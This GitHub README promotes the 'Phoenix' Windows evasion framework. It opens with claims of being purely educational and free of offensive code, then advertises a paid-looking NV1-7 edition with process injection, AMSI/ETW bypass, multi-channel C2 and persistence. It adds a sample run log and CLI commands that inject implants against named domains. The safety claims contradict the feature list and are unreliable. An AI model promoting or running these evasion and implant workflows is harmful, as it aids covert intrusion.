# 🔥 Phoenix Evasion Research Framework

![Banner](https://github.com/user-attachments/assets/ced6b386-30f2-4e66-ae95-33aa0012ff4f)

**Advanced Educational Windows Evasion Research Framework**  
Modern evasion techniques research for strengthening cybersecurity defenses.

[![Support WoodLabs](https://img.shields.io/badge/☕_Support_WoodLabs-Donate-ff6b35?style=for-the-badge&logo=coffee&logoColor=white)](https://saweria.co/WoodLabs)
[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.8%2B-green.svg)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Windows_%7C_Linux_%7C_macOS-lightgrey.svg)](https://github.com/QurolVoV/phoenix-evasion-research)
[![Stars](https://img.shields.io/github/stars/QurolVoV/phoenix-evasion-research?style=social)](https://github.com/QurolVoV/phoenix-evasion-research/stargazers)
[![CI/CD Pipeline](https://github.com/QurolVoV/Phoenix-Evasion-Research/actions/workflows/ci-cd.yml/badge.svg)](https://github.com/QurolVoV/Phoenix-Evasion-Research/actions/workflows/ci-cd.yml)

> **100% Educational • 0% Offensive • For Blue Teams & Security Researchers**

---

## 🌟 Support the Project

This project is 100% free and open-source thanks to community support.  
Every donation helps us release free research and tools to the security community!

[![Saweria QR](https://saweria.co/qr/3583835?size=200)](https://saweria.co/WoodLabs)  
**Donate at: https://saweria.co/WoodLabs**

---

## 📋 Table of Contents

- [About](#about)
- [Key Features](#key-features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Project Structure](#project-structure)
- [Usage Examples](#usage-examples)
- [Contributing](#contributing)
- [Troubleshooting](#troubleshooting)
- [FAQ](#faq)
- [Disclaimer & Legal](#disclaimer--legal)
- [Support & Contact](#support--contact)
- [License](#license)

---

## 🎯 About

Phoenix Evasion Research is a **free, open-source framework** designed to help cybersecurity professionals understand modern evasion techniques used by advanced malware and APT groups.

**Focus:** Defensive Security | Educational Purpose | Zero Offensive Code

### Who Is This For?

✅ Blue Team & SOC Analysts  
✅ Cybersecurity Researchers  
✅ Students & Academics  
✅ Authorized Red Teams  

### What's NOT Included

❌ Process Injection | ❌ C2 Infrastructure | ❌ AMSI Bypass | ❌ Persistence Mechanisms

---

## ✨ Key Features

| Feature | Description |
|---------|-------------|
| 🔐 **Advanced Encryption** | ChaCha20-Poly1305 + PBKDF2-HMAC-SHA512 (500k iterations) |
| 🔍 **Syscall Engine** | Direct SSN extraction from clean ntdll.dll (on-disk) |
| 🛡️ **Anti-Analysis Detection** | Debugger, VM, and sandbox detection (multi-technique) |
| 🔀 **Polymorphic Code** | Lazy loading + dynamic SSN resolution |
| 📊 **Automated Reporting** | Generate research reports in Markdown format |
| 📦 **100% Open Source** | MIT License - Free for education & research |

---

## 💻 Requirements

### Minimum
- **Python:** 3.8+
- **RAM:** 2GB
- **Storage:** 100MB
- **OS:** Windows 10+ or Linux

### Recommended
- **Python:** 3.10+
- **RAM:** 8GB+
- **Storage:** 1GB
- **OS:** Windows 11 or Ubuntu 20+

---

## 📥 Installation

### 1. Clone Repository

```bash
git clone https://github.com/QurolVoV/Phoenix-Evasion-Research.git
cd Phoenix-Evasion-Research
```

### 2. Setup Virtual Environment

**Linux/macOS:**
```bash
python3 -m venv venv
source venv/bin/activate
```

**Windows (Command Prompt):**
```cmd
python -m venv venv
venv\Scripts\activate
```

**Windows (PowerShell):**
```powershell
python -m venv venv
venv\Scripts\Activate.ps1
```

### 3. Install Dependencies

```bash
pip install --upgrade pip
pip install -r requirements.txt
```

### 4. Verify Installation

```bash
python -c "import sys; sys.path.insert(0, 'src'); from phoenix_evasion_research import *; print('✅ Installation successful!')"
```

---

## 🚀 Quick Start

### Run the Framework

```bash
python src/phoenix_evasion_research.py --help
```

### Basic Usage Examples

```bash
# Analyze obfuscation
python src/phoenix_evasion_research.py --module obfuscation --target "test_string"

# Analyze syscalls
python src/phoenix_evasion_research.py --module syscall

# Detect evasion techniques
python src/phoenix_evasion_research.py --module evasion --output report.md

# Run all modules
python src/phoenix_evasion_research.py --module all --output full_report.md
```

### Command Line Options

```
--help, -h                      Show help message
--module {all, obfuscation, syscall, evasion}
                                Select modules to run
--target TARGET                 Target/input for analysis
--output OUTPUT                 Output file for report (default: report.md)
```

---

## 📁 Project Structure

```
Phoenix-Evasion-Research/
├── src/
│   └── phoenix_evasion_research.py    # Main framework
├── k8s/                                # KDS configurations
├── .github/
│   └── workflows/
│       └── ci-cd.yml                  # CI/CD Pipeline
├── .gitignore                          # Git ignore rules
├── .dockerignore                       # Docker ignore rules
├── Dockerfile                          # Docker configuration
├── LICENSE                             # MIT License
├── README.md                           # Documentation
├── CONTRIBUTING.md                     # Contribution guidelines
├── SECURITY.md                         # Security policy
├── requirements.txt                    # Python dependencies
├── requirements-dev.txt                # Development dependencies
├── setup.py                            # Setup configuration
├── pyproject.toml                      # Project metadata
├── docker-compose.yml                  # Docker Compose
├── .pre-commit-config.yaml             # Pre-commit hooks
└── .dockerignore                       # Docker ignore

```

---

## 💻 Usage Examples

### Example 1: Basic Framework Usage

```bash
python src/phoenix_evasion_research.py --help
```

### Example 2: Obfuscation Analysis

```bash
python src/phoenix_evasion_research.py \
  --module obfuscation \
  --target "sensitive_data"
```

### Example 3: Syscall Analysis

```bash
python src/phoenix_evasion_research.py \
  --module syscall \
  --output syscall_analysis.md
```

### Example 4: Full Evasion Research

```bash
python src/phoenix_evasion_research.py \
  --module all \
  --target "test_target" \
  --output complete_research.md
```

### Example 5: Python API Usage

```python
import sys
sys.path.insert(0, 'src')
from phoenix_evasion_research import *

# Your custom research code here
print("Phoenix Evasion Research Framework loaded successfully!")
```

---

## 🤝 Contributing

We welcome contributions from the community!

### How to Contribute

1. **Fork** this repository
2. **Create a feature branch**
   ```bash
   git checkout -b feature/your-feature-name
   ```
3. **Make your changes** and commit
   ```bash
   git commit -m "Feature: add your feature description"
   ```
4. **Push to your branch**
   ```bash
   git push origin feature/your-feature-name
   ```
5. **Create a Pull Request** with detailed description

### Areas We Need Help With

- Advanced evasion techniques
- Cross-platform support
- Detection heuristics improvement
- Documentation enhancement
- Performance optimization
- Bug fixes and testing

See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.

---

## 🐛 Troubleshooting

### Dependency Installation Error

```bash
pip install -r requirements.txt --upgrade
```

### Import Error

```bash
# Ensure you're in the root directory
export PYTHONPATH="${PYTHONPATH}:$(pwd)/src"
python src/phoenix_evasion_research.py --help
```

### Windows Permission Denied

```cmd
# Run Command Prompt or PowerShell as Administrator
python src/phoenix_evasion_research.py --help
```

### Virtual Environment Issues

```bash
# Remove old venv and recreate
rm -rf venv  # Linux/macOS
rmdir /s venv  # Windows

# Create new environment
python -m venv venv
source venv/bin/activate  # or venv\Scripts\activate on Windows
pip install -r requirements.txt
```

### Module Not Found Error

```bash
# Add src directory to Python path
export PYTHONPATH="${PYTHONPATH}:$(pwd)/src"  # Linux/macOS
set PYTHONPATH=%PYTHONPATH%;%cd%\src  # Windows
```

### CI/CD Pipeline Failures

Check the [GitHub Actions](https://github.com/QurolVoV/Phoenix-Evasion-Research/actions) tab for detailed logs.

---

## ❓ FAQ

**Q: Is this framework safe to use?**  
A: Yes, for legitimate research and education purposes. There is no malicious code in the repository. All code is educational and defensive-focused.

**Q: Is it legal to use this framework?**  
A: This is an educational tool designed for authorized security research. Use only with proper authorization and comply with local laws.

**Q: Will antivirus detect this?**  
A: Possibly, since the framework studies evasion techniques. This is normal for research tools. Detection depends on your antivirus and usage patterns.

**Q: Can it be used commercially?**  
A: Yes, under the MIT License. Ensure compliance with local legal guidelines and responsible use policies.

**Q: How do I report a security vulnerability?**  
A: Please see [SECURITY.md](SECURITY.md) for responsible disclosure guidelines.

---

## 🔒 Disclaimer & Legal

### EDUCATIONAL AND RESEARCH USE ONLY

This framework is designed for:
- ✅ Authorized security research
- ✅ Defensive security development
- ✅ Academic training
- ✅ Threat detection improvement

### PROHIBITED USES

- ❌ Malicious or unauthorized access
- ❌ Testing without authorization
- ❌ Weaponization and offensive use
- ❌ Violating laws and regulations

### User Responsibilities

1. Obtain proper authorization before use
2. Comply with all local laws and regulations
3. Protect and maintain confidentiality of findings
4. Practice responsible disclosure

### No Warranty

Authors and contributors are not responsible for:
- Framework misuse or abuse
- Data loss or damage
- Legal consequences from unauthorized use
- Any other negative consequences

---

## 📞 Support & Contact

### GitHub
- **Issues:** [GitHub Issues](https://github.com/QurolVoV/Phoenix-Evasion-Research/issues)
- **Discussions:** [GitHub Discussions](https://github.com/QurolVoV/Phoenix-Evasion-Research/discussions)

### Email
📧 **Security-related inquiries:** redmoonstonee@gmail.com

![Image](https://github.com/user-attachments/assets/2e786b42-cf54-4787-a40a-444d0c81cdca)
### Getting Help

1. Check [documentation](README.md)
2. Search [existing issues](https://github.com/QurolVoV/Phoenix-Evasion-Research/issues)
3. Ask in [Discussions](https://github.com/QurolVoV/Phoenix-Evasion-Research/discussions)
4. Email for urgent matters

---

## 🌟 Support Our Research

If you find this project valuable and want to support ongoing security research:

[![Donate Saweria](https://img.shields.io/badge/%F0%9F%92%96_Donate-Saweria-FF5E5B?style=for-the-badge&logo=ko-fi&logoColor=white)](https://saweria.co/WoodLabs)

Your support enables us to:
- Continue open-source security research
- Maintain and regularly update the framework
- Develop new defensive security features
- Support the cybersecurity community with free tools
- Conduct advanced threat intelligence research

**Thank you for supporting WoodLabs Security Research!**

---

## 📝 Changelog

### Version 1.0 Beta (2025-11-25)
- ✨ Initial release
- 🔐 Advanced obfuscation (ChaCha20-Poly1305)
- 🔍 Syscall engine for EDR studies
- 🛡️ Anti-analysis framework
- 📊 Automated research reporting
- 🐳 Docker support
- ⚙️ Pre-commit hooks
- 📦 Development dependencies

---

## 📄 License

MIT License

Copyright (c) 2025 Woodlabs Security Research

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

**THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.**

---

## 🙏 Thank You

If this project helps your research or educational efforts:

- ⭐ **Star** this repository
- 🍴 **Fork** and contribute
- 💬 **Share** feedback and suggestions
- 📧 **Support** us for continued development

---

## 🔗 Quick Links

- [GitHub Repository](https://github.com/QurolVoV/Phoenix-Evasion-Research)
- [Report Issues](https://github.com/QurolVoV/Phoenix-Evasion-Research/issues)
- [Join Discussions](https://github.com/QurolVoV/Phoenix-Evasion-Research/discussions)
- [Contributing Guidelines](CONTRIBUTING.md)
- [Security Policy](SECURITY.md)
- [Donate & Support](https://saweria.co/WoodLabs)

---

## 🌟 Support the Project

If this framework helps your research or educational efforts, please consider supporting our work:  
[![Saweria](https://saweria.co/qr/3583835)](https://saweria.co/WoodLabs)

- Sustained development and updates
- New features
- Community support
- Open research

**Thank you for supporting WoodLabs Security Research!**

---

<div align="center">
🔥 Phoenix-Evasion-Research Framework
Advanced Security Research for Defensive Excellence
<br>Get Started • Documentation • Examples • Support
<br>
Building better defenses through understanding evasion
<br>
Woodlabs Security Research • 2025
</div>

----

🔥🎯 #Sneak Peek: NV1-7 Core Capabilities

----

# VERSI TERBATAS #

----

<div align="center">
# Phoenix Framework 2025 – NV1-7 (Woodlabs Edition)  
**Next-Generation Red Team & Evasion Research Framework**

[ P H O E N I X  2 0 2 5  •  W O O D L A B S  N V 1 - 7 ]

Woodlabs Security Research © 2025

</div>

**The Upgrade Robust, fully in-memory, multi-technique evasion & post-exploitation framework.**

----

### Warning: This Project is for Authorized Security Testing & Research Only
This tool implements **real offensive techniques** (Process Doppelganging, Hollowing, Direct Syscalls, D1rkSleep, AMSI/ETW bypass, multi-channel C2, etc).  
Penggunaan tanpa izin eksplisit adalah **melanggar hukum**.

----

### Features (NV1-7 – All Upgrades Integrated)

| Category                  | Technique Implemented                                                                 |
|---------------------------|---------------------------------------------------------------------------------------|
| Anti-Analysis             | Advanced Anti-Debug, Sandbox Detection (CPU/RAM/Disk/Uptime/VM artifacts), Timing checks |
| Memory Evasion            | D1rkSleep (AES-256-CTR selective section encryption), Polymorphic Syscall Engine       |
| Process Injection         | Process Doppelganging, Process Hollowing, Early Bird APC, Process Ghosting            |
| Syscall Evasion           | Direct Syscalls + SSN extraction + Polymorphic stubs + Clean NTDLL from disk          |
| String Obfuscation        | Argon2-derived ChaCha20-Poly1305 per-string encryption (zero plaintext in memory)     |
| C2 Communication          | DNS, HTTP/S, ICMP covert channels with ChaCha20-Poly1305 encryption + jitter          |
| AMSI / ETW Bypass         | Runtime memory patching (AmsiScanBuffer & EtwEventWrite)                               |
| Persistence               | Registry Run keys, Scheduled Tasks                                                    |
| OPSEC                     | Zero disk artifacts (Doppelganging), realistic HTTP headers, multi-fallback C2        |

---

### Sneak Peek – Core Engine (Woodlabs_Phoenix_NV1-7.py)

```python
# Phoenix Framework 2025 - Security Assessment Tool
# Version 2.0 NV1-7 - All upgrades integrated with consistent structure
# Copyright (c) 2025 - Woodlabs Security Research

Key Highlights dari 1100+ baris kode:

Polymorphic Direct Syscall Engine (HadesSyscallEngine)
D1rkSleep Implementation (AES-256-CTR section encryption)
4 Advanced Process Injection Techniques
   → Process Doppelganging (transacted NTFS + section mapping)
   → Process Hollowing (full PE parsing & relocation)
   → Early Bird APC Queueing
   → Process Ghosting (delete-on-close + hollowing)
String Obfuscation via Argon2 + ChaCha20-Poly1305 (zero static strings)
Multi-Channel C2 (DNS TXT, HTTPS, ICMP) dengan fallback otomatis
AMSI & ETW Patch via memory write
Advanced Anti-Debug + Sandbox Detection
Runtime PE Shellcode Generator
Persistence via Registry + SchTasks
Final Report Generator (Markdown)
```

----

OUTPUT
```
Authentication successful
[+] Executing advanced evasion techniques...
[+] AMSI/ETW bypass applied
[+] C2 channel activated: http
[+] Starting Process Doppelganging → svchost.exe
[+] Process Doppelganging SUCCESS → PID 4892
[+] Starting D1rkSleep for 2000ms
[+] D1rkSleep completed
[+] Installing persistence...
[+] Registry persistence installed
[+] Advanced report generated: phoenix_advanced_assessment_report.md

ASSESSMENT COMPLETED SUCCESSFULLY
```

## Technical Specifications

### Cryptographic Standards

| Algorithm | Purpose | Mode | Key Size |
|-----------|---------|------|----------|
| ChaCha20-Poly1305 | AEAD Encryption | - | 256-bit |
| AES | Memory Encryption | CTR | 256-bit |
| HKDF | Key Derivation | SHA-256 | Variable |
| Argon2 | KDF | Memory-hard | 256-bit |
| SHA-256 | Hashing | - | 256-bit |
| HMAC | Authentication | SHA-256 | 256-bit |

### Memory Specifications

| Component | Memory Usage | Cache Size | TTL |
|-----------|--------------|------------|-----|
| Nonce Tracker | Variable | 100,000 max | 3600s |
| SSN Cache | ~2KB | Unlimited | Session |
| Section Encryption | Per-section | Tracked | Lifetime |
| Beacon Buffer | ~4KB | 1 active | Session |

### Performance Metrics

| Operation | Avg Time | Max Time | Notes |
|-----------|----------|----------|-------|
| Obfuscate String | 50-150ms | 250ms | Argon2 + ChaCha20 |
| Encrypt Section | 100-500ms | 1s | Per 64KB section |
| Syscall Execution | 1-5ms | 10ms | Direct invocation |
| C2 Beacon | 500-2000ms | 5s | Network dependent |
| Injection (Doppelgang) | 1-3s | 5s | Transaction overhead |

### Windows API Usage

| Function | Purpose | Risk Level |
|----------|---------|------------|
| NtCreateTransaction | Transactional file creation | HIGH |
| NtCreateSection | Memory section mapping | HIGH |
| NtMapViewOfSection | View mapping to process | HIGH |
| NtAllocateVirtualMemory | Memory allocation | MEDIUM |
| NtWriteVirtualMemory | Memory writing | MEDIUM |
| NtQueueApcThread | APC queue injection | HIGH |
| VirtualAlloc/Protect | Memory manipulation | MEDIUM |
| SetFileInformationByHandle | File marking | MEDIUM |

---

## Comparison with Similar Tools

### Feature Comparison Matrix

| Feature | Phoenix Framework | Metasploit | Cobalt Strike | Sliver | Malleus |
|---------|-------------------|-----------|----------------|--------|---------|
| **Process Injection** | | | | | |
| Doppelganging | ✅ | ❌ | ✅ | ✅ | ❌ |
| Hollowing | ✅ | ✅ | ✅ | ✅ | ✅ |
| Early Bird APC | ✅ | ❌ | ✅ | ✅ | ❌ |
| Ghosting | ✅ | ❌ | ❌ | ❌ | ❌ |
| **Memory Evasion** | | | | | |
| D1rkSleep | ✅ | ❌ | ✅ | ✅ | ❌ |
| Polymorphic Syscalls | ✅ | ❌ | ✅ | ✅ | ✅ |
| AMSI Bypass | ✅ | ✅ | ✅ | ✅ | ✅ |
| ETW Bypass | ✅ | ❌ | ✅ | ✅ | ✅ |
| **C2 Communication** | | | | | |
| DNS Tunneling | ✅ | ✅ | ✅ | ✅ | ✅ |
| HTTP Beaconing | ✅ | ✅ | ✅ | ✅ | ✅ |
| ICMP Tunneling | ✅ | ❌ | ❌ | ❌ | ❌ |
| Multi-channel Failover | ✅ | ✅ | ✅ | ✅ | ❌ |
| **Encryption** | | | | | |
| ChaCha20-Poly1305 | ✅ | ❌ | ✅ | ✅ | ✅ |
| AES-256-CTR | ✅ | ✅ | ✅ | ✅ | ✅ |
| Argon2 KDF | ✅ | ❌ | ❌ | ❌ | ❌ |
| String Obfuscation | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Detection Evasion** | | | | | |
| Anti-Debug (5-layer) | ✅ | ❌ | ✅ | ✅ | ✅ |
| Sandbox Detection | ✅ | ❌ | ✅ | ✅ | ✅ |
| VM Detection | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Persistence** | | | | | |
| Registry Keys | ✅ | ✅ | ✅ | ✅ | ✅ |
| Scheduled Tasks | ✅ | ✅ | ✅ | ✅ | ✅ |
| Service Installation | ✅ | ❌ | ✅ | ✅ | ❌ |
| **Framework Features** | | | | | |
| CLI Interface | ✅ | ✅ | ✅ | ✅ | ✅ |
| Modular Architecture | ✅ | ✅ | ✅ | ✅ | ✅ |
| Python-based | ✅ | ✅ | ❌ | ✅ | ✅ |
| Open Source | ✅ | ✅ | ❌ | ✅ | ✅ |
| Active Development | ✅ | ✅ | ⚠️ | ✅ | ⚠️ |

### Detailed Comparison

#### Metasploit Framework
**Strengths:**
- Most mature framework in industry
- Extensive payload library
- Community-driven development
- Multi-stage payload support
- Automatic handler infrastructure

**Weaknesses:**
- Limited advanced evasion techniques
- No Doppelganging support
- Basic process injection only
- Slower execution on modern systems
- Deprecated AMSI bypass methods

**Phoenix Advantage:** Advanced memory evasion, Doppelganging, Ghosting, ICMP C2, Argon2 KDF

---

#### Cobalt Strike
**Strengths:**
- Commercial-grade reliability
- Professional sleep mask technology
- Excellent UI/UX
- Mature C2 infrastructure
- Strong post-exploitation features

**Weaknesses:**
- Expensive (requires licensing)
- Closed-source (security through obscurity)
- Less frequent innovation
- Large footprint (easier to detect)
- Requires dedicated operator training

**Phoenix Advantage:** Open-source, free, Ghosting injection, ICMP C2, multi-channel automatic failover, educational transparency

---

#### Sliver (Open-Source Cobalt Strike Alternative)
**Strengths:**
- Free, open-source alternative to Cobalt Strike
- Modern Go-based architecture
- Comparable feature set
- Active community development
- Strong encryption defaults

**Weaknesses:**
- Smaller community than Metasploit
- Less documentation available
- Newer framework (less battle-tested)
- Go binaries harder to customize
- Limited Windows API flexibility

**Phoenix Advantage:** Python-based flexibility, Doppelganging support, selective D1rkSleep encryption, Argon2 string obfuscation, educational-friendly

---

#### Malleus
**Strengths:**
- Specialized syscall manipulation
- Excellent polymorphic stub generation
- Lightweight design
- Fast execution

**Weaknesses:**
- Single-purpose tool (not full framework)
- No C2 infrastructure
- Limited post-exploitation
- No persistence mechanisms
- Minimal documentation

**Phoenix Advantage:** Complete framework, multi-channel C2, persistence, memory evasion, sandbox detection, comprehensive reporting

---

### Unique Phoenix Features

1. **ICMP C2 Channel**
   - Custom ICMP packet construction
   - Direct kernel ICMP socket usage
   - Completely covert tunneling method
   - Available in no other mainstream tool

2. **Process Ghosting**
   - Delete-on-execute technique
   - Zero disk footprint
   - Unique among open-source frameworks
   - Transaction-less alternative to Doppelganging

3. **Argon2 String Obfuscation**
   - Memory-hard KDF integration
   - Thread-safe nonce tracking
   - Unique per-string encryption
   - Automatic TTL-based cleanup

4. **Selective D1rkSleep**
   - Per-section AES-256-CTR encryption
   - Granular control over memory encryption
   - Clean NTDLL loading with hash verification
   - More sophisticated than simple sleep mask

5. **Multi-Channel Automatic Failover**
   - Intelligent channel switching
   - Simultaneous DNS/HTTP/ICMP operation
   - Jitter-based beacon interval
   - Realistic traffic pattern generation

6. **Integrated Sandbox Detection**
   - 6-point detection methodology
   - CPU cores analysis
   - Disk/RAM size verification
   - Process count evaluation
   - VM artifact identification

---

## Security Considerations

### For Authorized Users

⚠️ **DISCLAIMER**: Phoenix Framework is provided for authorized security research and penetration testing purposes only.

**Before Using:**
1. Obtain explicit written authorization from system owner
2. Ensure testing is within defined scope
3. Document all activities and findings
4. Maintain audit trail of all operations
5. Verify legal jurisdiction and compliance requirements

### OPSEC Guidelines

- **Network Isolation**: Test in isolated lab environments
- **Traffic Analysis**: Monitor beacon patterns for anomalies
- **Log Rotation**: Manage generated artifacts securely
- **Cleanup**: Remove persistence mechanisms after assessment
- **Reporting**: Document all techniques and findings
- **Attribution**: Understand potential indicators of compromise

### Detection Mitigation

**Recommended Defenses:**
- EDR with behavioral analysis capabilities
- Memory scanning for encrypted sections
- DNS query pattern analysis
- Anomalous process behavior monitoring
- Registry modification auditing
- AMSI/ETW integrity verification
- Syscall hooking and validation

---

## Limitations

### Technical Limitations

1. **Windows-Specific Features**: Many components require Windows (D1rkSleep, syscall engine, process injection)
2. **Privilege Requirements**: Full process injection requires elevated privileges
3. **API Coverage**: Not all Windows APIs have SSN available in all versions
4. **Network Dependent**: C2 requires outbound network connectivity
5. **Memory Constraints**: Large PE files may struggle with allocation

### Operational Limitations

1. **AV/EDR Detection**: Advanced behavioral analysis may still detect activity
2. **Network Detection**: DNS/HTTP/ICMP patterns may be identifiable
3. **Disk Artifacts**: Log files and reports persist on disk
4. **Registry Modifications**: Persistence mechanisms leave registry traces
5. **Performance Impact**: Memory encryption has computational overhead

### Maintenance Notes

- Requires updates for new Windows versions (SSN changes)
- AMSI/ETW bypass methods may require adjustment
- C2 infrastructure must be maintained separately
- Persistence mechanisms may be blocked by Group Policy
- Some techniques may conflict with security software

---

## Advanced Usage Scenarios

### Scenario 1: Red Team Engagement

```bash
# Multi-stage deployment with full evasion
python phoenix_framework.py \
  --target https://customer-domain.com \
  --payload stage1.exe \
  --technique doppelganging \
  --process svchost.exe \
  --c2-type all \
  --sleep-time 3000
```

### Scenario 2: APT Simulation

```bash
# High-stealth profile with ICMP C2
python phoenix_framework.py \
  --target https://critical-infrastructure.com \
  --payload aptimplant.exe \
  --technique ghosting \
  --process services.exe \
  --c2-type icmp \
  --icmp-target 10.0.0.1 \
  --sleep-time 10000
```

### Scenario 3: Blue Team Training

```bash
# Educational assessment with DNS C2
python phoenix_framework.py \
  --target https://internal-training.lab \
  --payload training-beacon.exe \
  --technique hollowing \
  --process explorer.exe \
  --c2-type dns \
  --dns-domain training.local
```

### Scenario 4: Persistence Testing

```bash
# Verify persistence mechanisms post-injection
python phoenix_framework.py \
  --target https://persistence-test.lab \
  --payload persistent-implant.exe \
  --technique earlybird \
  --process powershell.exe
# Inspect registry and scheduled tasks for persistence
```

---

## Changelog

### Version 2.0 NV1-7 (Current)
- **Added**: Process Ghosting injection technique
- **Added**: ICMP C2 tunneling channel
- **Added**: Argon2 string obfuscation
- **Added**: Selective D1rkSleep encryption
- **Added**: Polymorphic syscall stubs
- **Improved**: Multi-channel C2 failover logic
- **Improved**: Sandbox detection accuracy (6-point methodology)
- **Improved**: Anti-debugging capabilities (5-layer detection)
- **Fixed**: Windows 11 build 22000+ SSN compatibility
- **Fixed**: Memory leak in nonce tracker cleanup
- **Enhanced**: Comprehensive report generation

### Version 1.5
- Core process injection techniques
- Basic C2 communication
- AMSI/ETW bypass

### Version 1.0
- Initial release
- Syscall engine foundation
- Basic evasion techniques

---

## Acknowledgments

Phoenix Framework builds upon research and techniques pioneered by:
- Tal Melamed (Process Doppelganging)
- Hasherezade (Direct Syscall Execution)
- Dreamworks Security (Memory manipulation techniques)
- NIST (Cryptographic standards)
- Windows security research community
----

<div align="center">
[ P H O E N I X  2 0 2 5  •  W O O D L A B S  N V 1 - 7 ]
</div>

----


<div align="center">
 # Credits & Research

Original concept: QurolVoV – Phoenix Evasion Research
NV1-7 Woodlabs Edition by Woodlabs Security Research (2025)
Techniques inspired by: hfiref0x, ajpc500, Cobbr, Outflank, SpecterOps, D1rkMtr, etc.
<br> 
</div>

----

 #Legal Disclaimer

This framework is released exclusively for:
Authorized penetration testing
Red team operations
Malware research & defense development
Any unauthorized use is strictly prohibited and may violate computer misuse laws.

"They won't see you coming. They won't even know you were there."
Phoenix Framework 2025 – NV1-7
Woodlabs Security Research © 2025
Original research by QurolVoV.

----

<div align="center">
Phoenix Rising
<br>
  "The phoenix doesn’t rise from the ashes it burns everything down without leaving a trace."
<br>  
  Woodlabs Security Research © 2025
</div>
